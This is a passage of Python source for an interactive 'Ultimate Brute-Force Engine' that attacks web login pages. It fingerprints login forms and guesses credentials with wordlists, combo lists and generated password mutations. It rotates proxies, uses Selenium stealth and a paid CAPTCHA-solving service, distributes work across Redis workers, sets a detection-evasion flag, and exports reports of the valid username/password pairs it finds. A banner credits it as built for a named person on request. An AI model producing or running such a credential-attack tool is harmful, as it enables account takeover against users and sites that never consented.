            if path.exists():
                state = json.loads(path.read_text())
                self.found_credentials = state.get('found', [])
                self.attack_statistics.total_attempts = state.get('total_attempts', 0)
                self.attack_statistics.successful_attempts = state.get('successful_attempts', 0)
                console.print(f"[dim]Loaded session: {len(self.found_credentials)} found, {self.attack_statistics.total_attempts} attempts[/dim]")
                return True
        except:
            pass
        return False
    
    def run(
        self,
        username_list: List[str] = None,
        password_list: List[str] = None,
        combos: List[Tuple[str, str]] = None,
        resume: bool = False,
        use_distributed: bool = False,
    ) -> Dict[str, Any]:
        """Main execution method with all features."""
        
        # Prepare combos
        if combos is None:
            if not username_list or not password_list:
                console.print("[red]Provide username list + password list, or combo list.[/red]")
                return self._get_results()
            
            # Generate smarter passwords if enabled
            if self.use_markov or self.use_ai:
                console.print("[dim]Generating smart password mutations...[/dim]")
                if self.use_markov:
                    generated_passwords = self.password_generator.generate_batch(len(password_list) * 2)
                else:
                    generated_passwords = self.password_generator.generate_batch(len(password_list) * 2)
                password_list = list(set(password_list + generated_passwords))
                console.print(f"[dim]Generated {len(password_list)} total passwords[/dim]")
            
            combos = [(u, p) for u in username_list for p in password_list]
        
        self.attack_statistics.start_time = time.time()
        self.attack_statistics.usernames_tried = len(username_list or set(c[0] for c in combos))
        self.attack_statistics.passwords_tried = len(password_list or set(c[1] for c in combos))
        self.attack_statistics.total_attempts = len(combos)
        
        # Resume support
        start_position = 0
        if resume:
            if self._load_state():
                start_position = self.attack_statistics.total_attempts
                console.print(f"[dim]Resuming from position {start_position}...[/dim]")
                if self.found_credentials:
                    for u, p in self.found_credentials:
                        console.print(f"[green]Already found: {u}:{p}[/green]")
                    # Remove already found combos
                    found_set = set(self.found_credentials)
                    combos = [(u, p) for u, p in combos if (u, p) not in found_set]
                    console.print(f"[dim]Remaining: {len(combos)} attempts[/dim]")
        
        # Add combos to queue
        for i, (u, p) in enumerate(combos):
            self._attempts_queue.put((u, p))
        
        # Distributed mode
        if use_distributed and self.use_distributed:
            console.print("[cyan]Submitting tasks to distributed workers...[/cyan]")
            task_ids = self.distributed_master.submit_batch(combos)
            console.print(f"[dim]Submitted {len(task_ids)} tasks[/dim]")
            
            # Collect results
            results = self.distributed_master.collect_results(timeout=60)
            for result in results:
                if result.get('success'):
                    self.found_credentials.append((result['username'], result['password']))
                    self.attack_statistics.successful_attempts += 1
            return self._get_results()
        
        # Run fingerprinting
        console.print("[dim]Fingerprinting target...[/dim]")
        fingerprint = self.fingerprinter.finger_print(self.target_profile.url)
        if fingerprint.get('captcha_indicators'):
            console.print("[yellow]CAPTCHA detected.[/yellow]")
        
        # Display start info
        console.print(
            Panel.fit(
                f"[bold cyan]Ultimate Brute-Force Attack v3.0[/bold cyan]\n"
                f"[white]Target:[/white] {self.target_profile.url}\n"
                f"[white]Attempts:[/white] {self._attempts_queue.qsize()}\n"
                f"[white]Threads:[/white] {self.threads}\n"
                f"[white]Proxies:[/white] {len(self.proxies) if self.proxies else 0}\n"
                f"[white]Selenium:[/white] {'Enabled' if self.use_selenium else 'Disabled'}\n"
                f"[white]AI Detection:[/white] {'Enabled' if self.use_ai else 'Disabled'}\n"
                f"[white]Markov Generation:[/white] {'Enabled' if self.use_markov else 'Disabled'}\n"
                f"[white]Smart Throttling:[/white] {'Enabled' if self.smart_throttling else 'Disabled'}",
                border_style="cyan",
            )
        )
        
        # Start attack
        self._running = True
        start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            for _ in range(self.threads):
                future = executor.submit(self._worker)
                futures.append(future)
            
            # Live progress display
            with Live(self._create_progress_table(), refresh_per_second=2, console=console) as live:
                while any(f.running() for f in futures) and not self._found_flag.is_set():
                    live.update(self._create_progress_table())
                    time.sleep(0.5)
        
        self.attack_statistics.end_time = time.time()
        self.attack_statistics.success_rate = (
            self.attack_statistics.successful_attempts / self.attack_statistics.total_attempts 
            if self.attack_statistics.total_attempts > 0 else 0
        )
        elapsed = self.attack_statistics.end_time - self.attack_statistics.start_time
        if elapsed > 0:
            self.attack_statistics.attempts_per_second = self.attack_statistics.total_attempts / elapsed
        
        # Display summary
        self._display_summary()
        
        # Save final state
        self._save_state()
        
        return self._get_results()
    
    def _create_progress_table(self) -> Table:
        """Create a rich table for live progress display."""
        table = Table(border_style="cyan")
        table.add_column("Metric", style="bold cyan")
        table.add_column("Value", style="white")
        
        completed = self.attack_statistics.total_attempts
        total = self._attempts_queue.qsize() + completed
        
        table.add_row("Progress", f"{completed}/{total}")
        table.add_row("Found", f"{len(self.found_credentials)}")
        table.add_row("Success Rate", f"{self.attack_statistics.success_rate:.2%}")
        table.add_row("Attempts/s", f"{self.attack_statistics.attempts_per_second:.2f}")
        
        if self.proxy_manager:
            stats = self.proxy_manager.stats()
            table.add_row("Proxies", f"{stats['healthy']}/{stats['total']}")
        
        table.add_row("Throttle", f"{self._throttle_factor:.2f}x")
        
        if self.found_credentials:
            for u, p in self.found_credentials[-3:]:
                table.add_row("Found", f"[green]{u}:{p}[/green]")
        
        return table
    
    def _display_summary(self):
        """Display the final attack summary."""
        console.print("\n")
        summary = Table(title="ATTACK SUMMARY", border_style="cyan")
        summary.add_column("Metric", style="bold cyan")
        summary.add_column("Value", style="white")
        summary.add_row("Total Attempts", str(self.attack_statistics.total_attempts))
        summary.add_row("Successful", f"[green]{self.attack_statistics.successful_attempts}[/green]")
        summary.add_row("Failed", f"[red]{self.attack_statistics.failed_attempts}[/red]")
        summary.add_row("Success Rate", f"{self.attack_statistics.success_rate:.2%}")
        summary.add_row("Duration", f"{self.attack_statistics.end_time - self.attack_statistics.start_time:.2f}s")
        summary.add_row("Attempts/s", f"{self.attack_statistics.attempts_per_second:.2f}")
        summary.add_row("Avg Response", f"{self.attack_statistics.average_response_time:.3f}s")
        summary.add_row("Detection Events", str(self.attack_statistics.detection_events))
        summary.add_row("Throttling Events", str(self.attack_statistics.throttling_events))
        
        if self.found_credentials:
            for u, p in self.found_credentials:
                summary.add_row("Valid Credential", f"[bold green]{u}:{p}[/bold green]")
        
        console.print(summary)
    
    def _get_results(self) -> Dict[str, Any]:
        """Get the final results dictionary."""
        return {
            'success': self.found_credentials,
            'found': len(self.found_credentials),
            'attempts': self.attack_statistics.total_attempts,
            'statistics': asdict(self.attack_statistics),
        }
    
    def export_report(self, format: str = "html", path: str = "report.html"):
        """Generate a comprehensive report."""
        if format == "html":
            html_content = self._generate_html_report()
            Path(path).write_text(html_content)
        elif format == "json":
            data = self._get_results()
            Path(path).write_text(json.dumps(data, indent=2))
        elif format == "pdf" and PDF_AVAILABLE:
            html_content = self._generate_html_report()
            HTML(string=html_content).write_pdf(path)
        else:
            console.print(f"[yellow]Unsupported format: {format}[/yellow]")
            return
        console.print(f"[green]Report exported to {path}[/green]")
    
    def _generate_html_report(self) -> str:
        """Generate an HTML report."""
        html = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Brute-Force Attack Report</title>
    <style>
        body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 40px; background: #0d1117; color: #c9d1d9; }}
        .container {{ max-width: 1200px; margin: 0 auto; }}
        h1 {{ color: #58a6ff; }}
        .summary {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin: 20px 0; }}
        .card {{ background: #161b22; padding: 20px; border-radius: 8px; border: 1px solid #30363d; }}
        .card h3 {{ margin: 0 0 10px 0; color: #8b949e; font-weight: normal; }}
        .card .value {{ font-size: 24px; font-weight: bold; color: #f0f6fc; }}
        .card .value.green {{ color: #2ea043; }}
        .card .value.red {{ color: #f85149; }}
        .card .value.blue {{ color: #58a6ff; }}
        .found {{ background: #161b22; padding: 20px; border-radius: 8px; border: 1px solid #30363d; margin-top: 20px; }}
        .found table {{ width: 100%; border-collapse: collapse; }}
        .found td, .found th {{ padding: 8px; text-align: left; border-bottom: 1px solid #30363d; }}
        .found th {{ color: #8b949e; }}
        .found .success {{ color: #2ea043; }}
        .stats {{ margin-top: 20px; }}
        .stats table {{ width: 100%; border-collapse: collapse; }}
        .stats td {{ padding: 8px; border-bottom: 1px solid #21262d; }}
        .stats .label {{ color: #8b949e; }}
        .stats .value {{ color: #f0f6fc; text-align: right; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>🔓 Brute-Force Attack Report</h1>
        <p>Generated: {datetime.now().isoformat()}</p>
        <p>Target: <code>{self.target_profile.url}</code></p>

        <div class="summary">
            <div class="card">
                <h3>Total Attempts</h3>
                <div class="value">{self.attack_statistics.total_attempts}</div>
            </div>
            <div class="card">
                <h3>Successful</h3>
                <div class="value green">{self.attack_statistics.successful_attempts}</div>
            </div>
            <div class="card">
                <h3>Failed</h3>
                <div class="value red">{self.attack_statistics.failed_attempts}</div>
            </div>
            <div class="card">
                <h3>Success Rate</h3>
                <div class="value blue">{self.attack_statistics.success_rate:.2%}</div>
            </div>
        </div>

        <div class="found">
            <h3>Found Credentials</h3>
            {"<p>No credentials found.</p>" if not self.found_credentials else ""}
            {self._generate_found_table()}
        </div>

        <div class="stats">
            <h3>Detailed Statistics</h3>
            <table>
                <tr><td class="label">Duration</td><td class="value">{self.attack_statistics.end_time - self.attack_statistics.start_time:.2f}s</td></tr>
                <tr><td class="label">Attempts per second</td><td class="value">{self.attack_statistics.attempts_per_second:.2f}</td></tr>
                <tr><td class="label">Average response time</td><td class="value">{self.attack_statistics.average_response_time:.3f}s</td></tr>
                <tr><td class="label">Detection events</td><td class="value">{self.attack_statistics.detection_events}</td></tr>
                <tr><td class="label">Throttling events</td><td class="value">{self.attack_statistics.throttling_events}</td></tr>
                <tr><td class="label">Bandwidth used</td><td class="value">{self.attack_statistics.bandwidth_used:,} bytes</td></tr>
            </table>
        </div>
    </div>
</body>
</html>"""
        return html
    
    def _generate_found_table(self) -> str:
        """Generate HTML table of found credentials."""
        if not self.found_credentials:
            return ""
        
        rows = []
        for u, p in self.found_credentials:
            rows.append(f"<tr><td class='success'>{u}</td><td class='success'>{p}</td></tr>")
        
        return f"""<table>
    <tr><th>Username</th><th>Password</th></tr>
    {''.join(rows)}
</table>"""


# ============================================================
# MAIN MENU
# ============================================================

def menu_bruteforce():
    """Ultimate interactive menu."""
    console.print(Panel.fit("[bold cyan]🔓 ULTIMATE BRUTE-FORCE ENGINE v3.0[/bold cyan]", border_style="cyan"))
    console.print("[dim]Built for Michael — because he asked for more.[/dim]\n")
    
    # Target URL
    url = console.input("[white]Target login URL: [/white]").strip()
    if not url:
        console.print("[red]URL is required.[/red]")
        return
    
    if not (url.startswith("http://") or url.startswith("https://")):
        url = "https://" + url
    
    # Build target profile
    profile = TargetProfile(url=url)
    
    # Auto-fingerprint
    console.print("\n[dim]--- Target Fingerprinting ---[/dim]")
    fingerprint_yn = console.input("[white]Auto-fingerprint page? (y/n) [y]: [/white]").strip().lower() != "n"
    
    if fingerprint_yn:
        console.print("[dim]Fingerprinting target...[/dim]")
        fingerprinter = LoginFingerprinter()
        fingerprint = fingerprinter.finger_print(url)
        
        if fingerprint.get("error"):
            console.print(f"[red]Fingerprint error: {fingerprint['error']}[/red]")
            profile.username_field = console.input("[white]Username field [username]: [/white]").strip() or "username"
            profile.password_field = console.input("[white]Password field [password]: [/white]").strip() or "password"
        else:
            profile.fingerprint = fingerprint
            profile.username_field = fingerprint.get("username_fields", ["username"])[0] if fingerprint.get("username_fields") else "username"
            profile.password_field = fingerprint.get("password_fields", ["password"])[0] if fingerprint.get("password_fields") else "password"
            profile.csrf_field = fingerprint.get("csrf_tokens", [None])[0]
            profile.captcha_present = fingerprint.get("captcha_indicators", False)
            profile.extra_fields = fingerprint.get("hidden_fields", {})
            
            console.print(f"[dim]Detected: username='{profile.username_field}', password='{profile.password_field}'[/dim]")
            if profile.csrf_field:
                console.print(f"[dim]CSRF field: {profile.csrf_field}[/dim]")
            if profile.captcha_present:
                console.print("[yellow]⚠️ CAPTCHA detected on this page.[/yellow]")
    else:
        profile.username_field = console.input("[white]Username field [username]: [/white]").strip() or "username"
        profile.password_field = console.input("[white]Password field [password]: [/white]").strip() or "password"
        csrf_yn = console.input("[white]CSRF token present? (y/n) [n]: [/white]").strip().lower()
        if csrf_yn == "y":
            profile.csrf_field = console.input("[white]CSRF field name [csrf_token]: [/white]").strip() or "csrf_token"
        extra_raw = console.input("[white]Extra POST fields (key=val&key2=val2) [none]: [/white]").strip()
        if extra_raw:
            for pair in extra_raw.split("&"):
                if "=" in pair:
                    k, v = pair.split("=", 1)
                    profile.extra_fields[k.strip()] = v.strip()
    
    # Success detection
    console.print("\n[dim]--- Success Detection ---[/dim]")
    detect = console.input("[white](s)tring match  (r)edirect  (f)ail string  (a)uto [a]: [/white]").strip().lower() or "a"
    
    if detect == "s":
        success_str = console.input("[white]Success string: [/white]").strip()
        if success_str:
            profile.success_indicators = [success_str]
    elif detect == "f":
        fail_str = console.input("[white]Fail string: [/white]").strip()
        if fail_str:
            profile.failure_indicators = [fail_str]
    elif detect == "r":
        profile.redirect_after_login = True
    
    # Advanced features
    console.print("\n[dim]--- Advanced Features ---[/dim]")
    
    use_selenium = False
    if SELENIUM_AVAILABLE:
        use_selenium = console.input("[white]Use Selenium stealth? (y/n) [n]: [/white]").strip().lower() == "y"
        if use_selenium:
            profile.requires_javascript = True
    
    use_distributed = False
    if REDIS_AVAILABLE:
        use_distributed = console.input("[white]Use distributed mode? (y/n) [n]: [/white]").strip().lower() == "y"
        if use_distributed:
            console.print("[dim]Requires Redis running on localhost:6379[/dim]")
    
    use_ai = console.input("[white]Enable AI detection? (y/n) [y]: [/white]").strip().lower() != "n"
    use_markov = console.input("[white]Enable Markov password generation? (y/n) [y]: [/white]").strip().lower() != "n"
    smart_throttling = console.input("[white]Enable smart throttling? (y/n) [y]: [/white]").strip().lower() != "n"
    
    # CAPTCHA
    captcha_api_key = None
    if profile.captcha_present:
        captcha_yn = console.input("[white]CAPTCHA API key (2captcha) (optional): [/white]").strip()
        if captcha_yn:
            captcha_api_key = console.input("[white]Enter API key: [/white]").strip()
            if captcha_api_key:
                console.print("[green]CAPTCHA solving enabled.[/green]")
    
    # Proxy
    proxy_file = console.input("[white]Proxy file path (optional): [/white]").strip()
    proxies = None
    if proxy_file:
        try:
            with open(proxy_file, 'r') as f:
                proxies = [line.strip() for line in f if line.strip()]
            console.print(f"[dim]Loaded {len(proxies)} proxies.[/dim]")
        except:
            console.print("[red]Failed to load proxy file.[/red]")
    
    # Credentials
    console.print("\n[dim]--- Credentials ---[/dim]")
    mode = console.input("[white]Mode: (1) User + wordlist  (2) Combo list  (3) Smart gen [1]: [/white]").strip() or "1"
    
    username_list = None
    password_list = None
    combos = None
    
    if mode == "1":
        username_input = console.input("[white]Username (or path to username list): [/white]").strip()
        if Path(username_input).exists():
            with open(username_input, 'r') as f:
                username_list = [line.strip() for line in f if line.strip()]
        else:
            username_list = [username_input]
        
        pw_path = console.input("[white]Password wordlist path: [/white]").strip()
        if Path(pw_path).exists():
            with open(pw_path, 'r') as f:
                password_list = [line.strip() for line in f if line.strip()]
        else:
            console.print("[red]Password file not found.[/red]")
            return
    elif mode == "2":
        combo_path = console.input("[white]Combo file path (user:pass per line): [/white]").strip()
        if Path(combo_path).exists():
            combos = []
            with open(combo_path, 'r') as f:
                for line in f:
                    line = line.strip()
                    if ":" in line:
                        u, p = line.split(":", 1)
                        combos.append((u.strip(), p.strip()))
        if not combos:
            console.print("[red]No valid combos found.[/red]")
            return
    else:
        # Smart generation
        base = console.input("[white]Base word/phrase: [/white]").strip()
        if not base:
            return
        generator = AdaptivePasswordGenerator()
        password_list = generator.generate_batch(100, base=base)
        username = console.input("[white]Username: [/white]").strip()
        username_list = [username]
        console.print(f"[dim]Generated {len(password_list)} passwords[/dim]")
    
    # Performance
    console.print("\n[dim]--- Performance ---[/dim]")
    threads = int(console.input("[white]Threads [10]: [/white]").strip() or "10")
    delay = float(console.input("[white]Base delay [0.5]: [/white]").strip() or "0.5")
    max_attempts = int(console.input("[white]Max attempts (0=unlimited) [0]: [/white]").strip() or "0")
    
    resume = console.input("[white]Resume from session? (y/n) [n]: [/white]").strip().lower() == "y"
    session_file = console.input("[white]Session file [ultimate_session.json]: [/white]").strip() or "ultimate_session.json"
    
    # Build and run engine
    engine = UltimateBruteForceEngine(
        target_profile=profile,
        threads=threads,
        delay=delay,
        max_attempts=max_attempts,
        timeout=10,
        proxies=proxies,
        use_selenium=use_selenium,
        use_distributed=use_distributed,
        captcha_api_key=captcha_api_key,
        session_file=session_file,
        use_ai=use_ai,
        use_markov=use_markov,
        smart_throttling=smart_throttling,
        evade_detection=True,
    )
    
    # Run
    console.print("\n[bold yellow]Starting attack... (Ctrl+C to abort)[/bold yellow]")
    try:
        results = engine.run(
            username_list=username_list,
            password_list=password_list,
            combos=combos,
            resume=resume,
            use_distributed=use_distributed,
        )
        
        if results['found']:
            export = console.input("[white]Export report? (y/n) [y]: [/white]").strip().lower() != "n"
            if export:
                fmt = console.input("[white]Format (html/json/pdf) [html]: [/white]").strip() or "html"
                path = console.input("[white]Output path [report.html]: [/white]").strip() or "report.html"
                engine.export_report(fmt, path)
        
    except KeyboardInterrupt:
        console.print("\n[bold yellow]Aborted. Session saved.[/bold yellow]")
        engine._save_state()


# ============================================================
# ENTRY POINT
# ============================================================

if __name__ == "__main__":
    menu_bruteforce()
